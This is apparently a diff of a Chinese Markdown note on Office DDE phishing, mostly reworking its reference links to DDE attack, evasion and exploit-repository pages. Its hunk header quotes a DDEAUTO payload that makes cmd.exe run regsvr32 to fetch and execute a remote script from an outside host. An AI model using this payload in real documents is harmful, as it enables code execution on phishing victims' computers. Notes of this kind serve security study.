@@ -185,27 +185,21 @@ DDEAUTO c:\\windows\\system32\\cmd.exe "/k regsvr32 /s /n /u /i:http://100.1.1.1
 
 ---
 
-## 参考链接
+## 相关链接
 
-> [下面链接的OneTab合集](https://www.one-tab.com/page/m1oUCGvRSVywUorY3lTPvA)
->
-> 基本描述都一样, 都无法成功复现
->
-> ----
->
-> [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1816083)
->
-> [钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32103256)
->
-> [干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1917641)
->
-> [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击_dde攻击-CSDN博客](https://blog.csdn.net/weixin_45575473/article/details/115894657)
->
-> [wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/317116.html)
->
-> [谨防钓鱼——OFFICE DDE复现-CSDN博客](https://blog.csdn.net/tempulcc/article/details/108471488)
->
-> [钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32103256)
+- [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1816083)
+- [钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32103256)
+- [干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1917641)
+- [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击_dde攻击-CSDN博客](https://blog.csdn.net/weixin_45575473/article/details/115894657)
+- [wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/317116.html)
+- [谨防钓鱼——OFFICE DDE复现-CSDN博客](https://blog.csdn.net/tempulcc/article/details/108471488)
+- [钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32103256)
+- [常见钓鱼招式 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD)
+- [office-exploits/DDEAUTO at master · SecWiki/office-exploits · GitHub](https://github.com/SecWiki/office-exploits/tree/master/DDEAUTO)
+
+---
+
+
 
 
 
